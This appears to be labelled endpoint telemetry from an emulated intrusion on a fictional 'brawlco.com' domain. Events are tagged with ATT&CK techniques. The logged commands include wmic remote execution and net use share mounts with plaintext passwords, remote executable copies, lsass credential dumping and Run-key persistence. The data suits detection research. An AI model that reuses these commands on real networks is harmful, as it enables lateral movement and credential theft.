create,zissler-pc.brawlco.com,c0ad744c-87f4-4364-9270-4edf4b211b70,1272.0,2017-05-01T19:13:16.129000+00:00,2017-05-01T19:13:15.673000+00:00,event,process,3388.0,zissler-pc.brawlco.com,"wmic /node:""minahan-pc.brawlco.com"" /user:""brawlco\gminahan"" /password:""qSR]r8XmKX"" process call create ""C:\west.exe -d -f""",194,,,,,,,
,,742fdcce-6a6d-4e51-a976-c6789b17e760,,,,step,,,,,195,,,['c0ad744c-87f4-4364-9270-4edf4b211b70'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,minahan-pc.brawlco.com,f80497e0-c465-46cb-99c3-e7dbadc1ebdc,1436.0,2017-05-01T19:13:47.837000+00:00,2017-05-01T19:13:38.922000+00:00,event,process,3564.0,minahan-pc.brawlco.com,powershell -command -,196,,,,,,,
open,minahan-pc.brawlco.com,d5ca083a-661c-429b-bd41-351674941e1d,,2017-05-01T19:13:47.837000+00:00,2017-05-01T19:13:38.922000+00:00,event,process,,minahan-pc.brawlco.com,,197,C:\Windows\System32\lsass.exe,1436.0,,,,,
,,b887ca57-bb1a-4ee4-93ef-a4e16deb8976,,,,step,,,,,198,,,"['f80497e0-c465-46cb-99c3-e7dbadc1ebdc', 'd5ca083a-661c-429b-bd41-351674941e1d']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,minahan-pc.brawlco.com,fef35bdc-6cf7-412d-bd07-c169ce0fed84,2332.0,2017-05-01T19:14:12.204000+00:00,2017-05-01T19:14:11.899000+00:00,event,process,3564.0,minahan-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\west.exe /f,199,,,,,,,
add,minahan-pc.brawlco.com,72db5e20-b57b-4a60-8dc6-a9ef4d83cc79,,2017-05-01T19:14:13.121000+00:00,2017-05-01T19:14:11.725000+00:00,event,registry,,minahan-pc.brawlco.com,,200,,,,,C:\west.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,438f4dcf-1ac5-4e2d-96dd-17a8408daf27,,,,step,,,,,201,,,"['fef35bdc-6cf7-412d-bd07-c169ce0fed84', '72db5e20-b57b-4a60-8dc6-a9ef4d83cc79']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,ostermeyer-pc.brawlco.com,33f9a536-de03-423d-bdcb-128156fd1774,3248.0,2017-05-01T19:14:35.327000+00:00,2017-05-01T19:14:35.081000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,net use \\sespinosa-pc.brawlco.com\C$ x%6vn]60E# /user:brawlco\wsespinosa,202,,,,,,,
,,d31c0194-f2b3-4dd5-a01e-c1a2b73cf086,,,,step,,,,,203,,,['33f9a536-de03-423d-bdcb-128156fd1774'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,b8494516-b2c6-4f3c-b6c8-8347bbc362ea,272.0,2017-05-01T19:14:58.647000+00:00,2017-05-01T19:14:58.353000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\sespinosa-pc.brawlco.com\C$\philadelphia.exe""",204,,,,,,,
create,sespinosa-pc.brawlco.com,ec3ac7e0-39e4-4cb8-91d8-af20828088d0,,2017-05-01T19:14:59.331000+00:00,2017-05-01T19:14:58.112000+00:00,event,file,,sespinosa-pc.brawlco.com,,205,C:\philadelphia.exe,,,,,,
,,910f6620-5e62-4050-baf1-e4fa4d7b2e0b,,,,step,,,,,206,,,"['b8494516-b2c6-4f3c-b6c8-8347bbc362ea', 'ec3ac7e0-39e4-4cb8-91d8-af20828088d0']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,santilli-pc.brawlco.com,48fb82d0-4ed7-4808-9cb9-49dc0d93c2f4,4024.0,2017-05-01T19:15:02.300000+00:00,2017-05-01T19:15:01.738000+00:00,event,process,4004.0,santilli-pc.brawlco.com,"wmic /node:""sespinosa-pc.brawlco.com"" /user:""brawlco\wsespinosa"" /password:""x%6vn]60E#"" process call create ""C:\philadelphia.exe -d -f""",207,,,,,,,
,,b7ba11cb-d6ef-40ec-bfb0-58425aedfc39,,,,step,,,,,208,,,['48fb82d0-4ed7-4808-9cb9-49dc0d93c2f4'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,sespinosa-pc.brawlco.com,b244b233-13b0-4e27-b185-4120c9b1c42e,1580.0,2017-05-01T19:15:35.609000+00:00,2017-05-01T19:15:25.407000+00:00,event,process,984.0,sespinosa-pc.brawlco.com,powershell -command -,209,,,,,,,
open,sespinosa-pc.brawlco.com,a00fca5c-b5f0-49a4-8ffd-fc4aa7dd726e,,2017-05-01T19:15:35.609000+00:00,2017-05-01T19:15:25.407000+00:00,event,process,,sespinosa-pc.brawlco.com,,210,C:\Windows\System32\lsass.exe,1580.0,,,,,
,,183482c8-53d1-4845-89cd-03b6bfe0a0d2,,,,step,,,,,211,,,"['b244b233-13b0-4e27-b185-4120c9b1c42e', 'a00fca5c-b5f0-49a4-8ffd-fc4aa7dd726e']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,sespinosa-pc.brawlco.com,7992bcef-967d-4360-9759-33be21df27fa,2668.0,2017-05-01T19:16:00.423000+00:00,2017-05-01T19:16:00.103000+00:00,event,process,984.0,sespinosa-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\philadelphia.exe /f,212,,,,,,,
add,sespinosa-pc.brawlco.com,452414db-09a1-4d82-acc7-c91eca1176b7,,2017-05-01T19:16:01.424000+00:00,2017-05-01T19:15:59.902000+00:00,event,registry,,sespinosa-pc.brawlco.com,,213,,,,,C:\philadelphia.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,6950c930-f456-4408-8ef2-6f1175a4c22c,,,,step,,,,,214,,,"['7992bcef-967d-4360-9759-33be21df27fa', '452414db-09a1-4d82-acc7-c91eca1176b7']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,kressierer-pc.brawlco.com,b6d68e38-2bbf-461d-827d-bb7c03dcd1d2,304.0,2017-05-01T19:16:24.041000+00:00,2017-05-01T19:16:23.739000+00:00,event,process,3520.0,kressierer-pc.brawlco.com,net use \\harley-pc.brawlco.com\C$ FuVuL*F6fU /user:brawlco\dharley,215,,,,,,,
,,19169a40-8dce-4cc4-b492-2f280dc9544c,,,,step,,,,,216,,,['b6d68e38-2bbf-461d-827d-bb7c03dcd1d2'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,kressierer-pc.brawlco.com,14084939-9678-492c-a833-4112d8f11e24,2816.0,2017-05-01T19:16:47.521000+00:00,2017-05-01T19:16:47.136000+00:00,event,process,3520.0,kressierer-pc.brawlco.com,"cmd /c copy ""C:\philadelphia.exe"" ""\\harley-pc.brawlco.com\C$\west.exe""",217,,,,,,,
create,harley-pc.brawlco.com,3037ee54-1478-4791-9eaf-11a6d8af4767,,2017-05-01T19:16:48.176000+00:00,2017-05-01T19:16:46.926000+00:00,event,file,,harley-pc.brawlco.com,,218,C:\west.exe,,,,,,
,,2b68b8e3-f3e0-413b-a855-a6ab2544668a,,,,step,,,,,219,,,"['14084939-9678-492c-a833-4112d8f11e24', '3037ee54-1478-4791-9eaf-11a6d8af4767']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,teston-pc.brawlco.com,436fddad-3802-4960-ba7c-369e0dedaa35,896.0,2017-05-01T19:16:52.101000+00:00,2017-05-01T19:16:50.966000+00:00,event,process,928.0,teston-pc.brawlco.com,"wmic /node:""harley-pc.brawlco.com"" /user:""brawlco\dharley"" /password:""FuVuL*F6fU"" process call create ""C:\west.exe -d -f""",220,,,,,,,
,,f312525b-9bf0-4b3d-8428-0394b71dbdae,,,,step,,,,,221,,,['436fddad-3802-4960-ba7c-369e0dedaa35'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,harley-pc.brawlco.com,c6e67ad8-1b26-4337-8c74-d4452aeb7680,2100.0,2017-05-01T19:17:39.036000+00:00,2017-05-01T19:17:18.789000+00:00,event,process,3508.0,harley-pc.brawlco.com,powershell -command -,222,,,,,,,
open,harley-pc.brawlco.com,1810a78b-03d2-4f43-91bf-179c20deca26,,2017-05-01T19:17:39.036000+00:00,2017-05-01T19:17:18.789000+00:00,event,process,,harley-pc.brawlco.com,,223,C:\Windows\System32\lsass.exe,2100.0,,,,,
,,e8c8a773-8e22-4136-a9a9-44bba3c30fc0,,,,step,,,,,224,,,"['c6e67ad8-1b26-4337-8c74-d4452aeb7680', '1810a78b-03d2-4f43-91bf-179c20deca26']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,harley-pc.brawlco.com,66b5ac16-e6fd-4ae4-a1eb-1ab92701e756,3008.0,2017-05-01T19:18:04.180000+00:00,2017-05-01T19:18:03.897000+00:00,event,process,3508.0,harley-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\west.exe /f,225,,,,,,,
add,harley-pc.brawlco.com,141b8107-0215-4b3c-915c-84e950a35b5e,,2017-05-01T19:18:05.316000+00:00,2017-05-01T19:18:03.681000+00:00,event,registry,,harley-pc.brawlco.com,,226,,,,,C:\west.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,ef31b036-5c86-4515-9e97-7d1b45255ba8,,,,step,,,,,227,,,"['66b5ac16-e6fd-4ae4-a1eb-1ab92701e756', '141b8107-0215-4b3c-915c-84e950a35b5e']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,santilli-pc.brawlco.com,3c7b9cd9-f921-4de6-b1d9-4e9584912e54,2956.0,2017-05-01T19:18:28.809000+00:00,2017-05-01T19:18:28.519000+00:00,event,process,4004.0,santilli-pc.brawlco.com,net use \\beane-pc.brawlco.com\C$ UUOsV1yY]b /user:brawlco\abeane,228,,,,,,,
,,4cf1bf45-04bc-4cae-a80e-9d179224ce62,,,,step,,,,,229,,,['3c7b9cd9-f921-4de6-b1d9-4e9584912e54'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,santilli-pc.brawlco.com,b47ba726-2694-48ca-b7e6-eb5229fb3ce0,3404.0,2017-05-01T19:18:52.120000+00:00,2017-05-01T19:18:51.861000+00:00,event,process,4004.0,santilli-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\beane-pc.brawlco.com\C$\and.exe""",230,,,,,,,
create,beane-pc.brawlco.com,7a789758-e238-4a8d-a2f0-d43f80fdbd2d,,2017-05-01T19:18:52.788000+00:00,2017-05-01T19:18:51.620000+00:00,event,file,,beane-pc.brawlco.com,,231,C:\and.exe,,,,,,
,,55e88091-75f8-4684-abd0-1b3df2861f62,,,,step,,,,,232,,,"['b47ba726-2694-48ca-b7e6-eb5229fb3ce0', '7a789758-e238-4a8d-a2f0-d43f80fdbd2d']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,kressierer-pc.brawlco.com,1f0ae2bc-ee9a-45f5-8c17-34adaa63442a,1284.0,2017-05-01T19:18:56.572000+00:00,2017-05-01T19:18:55.724000+00:00,event,process,3520.0,kressierer-pc.brawlco.com,"wmic /node:""beane-pc.brawlco.com"" /user:""brawlco\abeane"" /password:""UUOsV1yY]b"" process call create ""C:\and.exe -d -f""",233,,,,,,,
,,f9a6993e-5356-49e9-a29b-2b6628413ff6,,,,step,,,,,234,,,['1f0ae2bc-ee9a-45f5-8c17-34adaa63442a'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,beane-pc.brawlco.com,158c7522-5cec-4ce2-b50d-dc1b369f8ef2,756.0,2017-05-01T19:19:29.811000+00:00,2017-05-01T19:19:20.129000+00:00,event,process,3248.0,beane-pc.brawlco.com,powershell -command -,235,,,,,,,
open,beane-pc.brawlco.com,20d8eda0-1af6-4c1a-ad7f-f675f06b0730,,2017-05-01T19:19:29.811000+00:00,2017-05-01T19:19:20.129000+00:00,event,process,,beane-pc.brawlco.com,,236,C:\Windows\System32\lsass.exe,756.0,,,,,
,,d605b43d-f742-4ddd-aa6a-7250922674a1,,,,step,,,,,237,,,"['158c7522-5cec-4ce2-b50d-dc1b369f8ef2', '20d8eda0-1af6-4c1a-ad7f-f675f06b0730']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,beane-pc.brawlco.com,2830715a-5191-46cc-a956-b2570ab43e81,1284.0,2017-05-01T19:19:54.844000+00:00,2017-05-01T19:19:54.566000+00:00,event,process,3248.0,beane-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\and.exe /f,238,,,,,,,
add,beane-pc.brawlco.com,bb5f2314-94a3-412b-802e-ec7817ea0f97,,2017-05-01T19:19:56.015000+00:00,2017-05-01T19:19:54.373000+00:00,event,registry,,beane-pc.brawlco.com,,239,,,,,C:\and.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
